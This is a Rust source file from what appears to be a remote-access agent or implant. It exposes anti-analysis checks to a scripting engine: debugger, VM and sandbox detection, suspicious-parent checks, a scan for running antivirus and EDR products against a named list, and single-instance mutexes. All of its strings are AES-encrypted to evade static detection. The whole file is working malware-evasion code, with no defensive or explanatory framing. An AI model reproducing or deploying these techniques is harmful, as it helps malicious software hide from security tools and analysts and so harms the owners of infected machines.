// src/agent/scripting/evasion.rs
//
// Exposes the existing evasion/detection.rs primitives to RHAI and adds
// debugger detection, timing-based sandbox checks, and named-mutex
// single-instance guards.

use rhai::Engine;
use std::sync::{Mutex, OnceLock};
use std::collections::HashMap;
use crate::strcrypt_rt;
use strcrypt::aes_str;

// Global store for mutex handles so they survive the duration of the script.
// Keyed by name -> platform handle (stored as usize for Send-safety).
static MUTEX_STORE: OnceLock<Mutex<HashMap<String, usize>>> = OnceLock::new();

fn mutex_store() -> &'static Mutex<HashMap<String, usize>> {
    MUTEX_STORE.get_or_init(|| Mutex::new(HashMap::new()))
}

pub fn register(engine: &mut Engine) {

    // ── VM / virtualisation detection ─────────────────────────────────────────
    // Delegates directly to the existing detection::is_virtualized() logic.

    engine.register_fn(&aes_str!("internal_vm_detect"), || -> String {
        if crate::agent::evasion::detection::is_virtualized() { aes_str!("true") } else { aes_str!("false") }
    });

    // ── Debugger detection ────────────────────────────────────────────────────

    engine.register_fn(&aes_str!("internal_debugger_detect"), || -> String {
        let detected: bool = {
            #[cfg(target_os = "windows")]
            { unsafe { use super::win_ffi::proc_ext::IsDebuggerPresent; IsDebuggerPresent() != 0 } }
            #[cfg(target_os = "linux")]
            {
                std::fs::read_to_string(aes_str!("/proc/self/status"))
                    .ok()
                    .and_then(|s| {
                        s.lines()
                            .find(|l| l.starts_with(aes_str!("TracerPid:").as_str()))
                            .and_then(|l| l.split_whitespace().nth(1))
                            .and_then(|v| v.parse::<i64>().ok())
                    })
                    .map(|pid| pid != 0)
                    .unwrap_or(false)
            }
            #[cfg(not(any(target_os = "windows", target_os = "linux")))]
            false
        };
        if detected { aes_str!("true") } else { aes_str!("false") }
    });

    // ── Parent process check ──────────────────────────────────────────────────
    // Returns true when the parent is NOT in the allowed list (i.e. suspicious).

    engine.register_fn(&aes_str!("internal_parent_check"), |allowed_json: &str| -> String {
        let allowed: Vec<String> = serde_json::from_str(allowed_json).unwrap_or_default();
        if crate::agent::evasion::detection::is_bad_parent(&allowed) { aes_str!("true") } else { aes_str!("false") }
    });

    // ── Timing-based sandbox detection ────────────────────────────────────────
    // Some sandboxes accelerate time to get past sleep() calls.
    // Returns true if a 1-second sleep consumed less than 750 ms of wall time.

    engine.register_fn(&aes_str!("internal_timing_check"), || -> String {
        let start  = std::time::Instant::now();
        std::thread::sleep(std::time::Duration::from_secs(1));
        let elapsed = start.elapsed().as_millis();
        if elapsed < 750 { aes_str!("true") } else { aes_str!("false") }
    });

    // ── AV / EDR process detection ────────────────────────────────────────────
    // Scans the running process list for known security product names.
    // Returns JSON array of detected product names.

    engine.register_fn(&aes_str!("internal_av_detect"), || -> String {
        // Known security-product process names; each is encrypted at rest
        // and decrypted on scan (was a plain const table).
        let av_names: Vec<String> = vec![
            aes_str!("MsMpEng"), aes_str!("msmpeng"), aes_str!("MpCmdRun"), aes_str!("NisSrv"),
            aes_str!("bdagent"), aes_str!("bdredline"), aes_str!("vsserv"),
            aes_str!("avp"), aes_str!("avpui"), aes_str!("klnagent"),
            aes_str!("savservice"), aes_str!("ALMon"),
            aes_str!("CylanceSvc"), aes_str!("CylanceUI"),
            aes_str!("cb"), aes_str!("cbdefense"), aes_str!("CarbonBlack"),
            aes_str!("SentinelAgent"), aes_str!("SentinelServiceHost"),
            aes_str!("xagt"), aes_str!("xagtnotif"),
            aes_str!("CSFalconService"), aes_str!("CSFalconContainer"),
            aes_str!("csc32"), aes_str!("csc64"), aes_str!("cschost"),
            aes_str!("elastic-agent"), aes_str!("elastic-endpoint"),
            aes_str!("Cortex"), aes_str!("traps"),
            aes_str!("cyserver"), aes_str!("cyelp"),
        ];
        let procs = crate::utils::get_process_list();
        let procs_lower = procs.to_lowercase();
        let found: Vec<&str> = av_names.iter()
            .filter(|name| procs_lower.contains(&name.to_lowercase()))
            .map(|s| s.as_str())
            .collect();
        serde_json::to_string(&found).unwrap_or("[]".into())
    });

    // ── Named mutex (single-instance guard) ───────────────────────────────────
    // Returns true if the mutex was newly created (this is the first instance).
    // Returns false if the mutex already exists (another instance is running).
    // The handle is kept alive for the process lifetime.

    engine.register_fn(&aes_str!("internal_mutex_create"), |name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let Ok(cname) = CString::new(name) else { return aes_str!("false") };
            unsafe {
                use super::win_ffi::proc_ext::*;
                let h = CreateMutexA(std::ptr::null_mut(), 1, cname.as_ptr());
                if h.is_null() { return aes_str!("false"); }
                extern "system" { fn GetLastError() -> u32; }
                let err = GetLastError();
                // ERROR_ALREADY_EXISTS = 183
                if err == 183 {
                    super::win_ffi::win_ext::CloseHandle(h);
                    return aes_str!("false");
                }
                // Store handle so it outlives this call.
                if let Ok(mut store) = mutex_store().lock() {
                    store.insert(name.to_string(), h as usize);
                }
                aes_str!("true")
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Lockfile approach: O_CREAT | O_EXCL guarantees atomicity.
            let path = std::env::temp_dir().join(format!("{}{}", aes_str!(".rcm_mutex_"), name));
            match std::fs::OpenOptions::new().write(true).create_new(true).open(&path) {
                Ok(_)  => {
                    if let Ok(mut store) = mutex_store().lock() {
                        store.insert(name.to_string(), 1);
                    }
                    aes_str!("true")
                }
                Err(_) => aes_str!("false"),
            }
        }
    });

    engine.register_fn(&aes_str!("internal_mutex_exists"), |name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            let Ok(cname) = CString::new(name) else { return aes_str!("false") };
            unsafe {
                use super::win_ffi::proc_ext::*;
                let h = OpenMutexA(MUTEX_ALL_ACCESS, 0, cname.as_ptr());
                if h.is_null() { return aes_str!("false"); }
                super::win_ffi::win_ext::CloseHandle(h);
                aes_str!("true")
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            if std::env::temp_dir().join(format!("{}{}", aes_str!(".rcm_mutex_"), name)).exists() {
                aes_str!("true")
            } else {
                aes_str!("false")
            }
        }
    });

    engine.register_fn(&aes_str!("internal_mutex_release"), |name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            if let Ok(mut store) = mutex_store().lock() {
                if let Some(h) = store.remove(name) {
                    unsafe { super::win_ffi::win_ext::CloseHandle(h as *mut std::ffi::c_void); }
                    return aes_str!("Released");
                }
            }
            aes_str!("Not found")
        }
        #[cfg(not(target_os = "windows"))]
        {
            let path = std::env::temp_dir().join(format!("{}{}", aes_str!(".rcm_mutex_"), name));
            match std::fs::remove_file(&path) {
                Ok(_)  => aes_str!("Released"),
                Err(e) => format!("{}{}", aes_str!("Error: "), e),
            }
        }
    });
}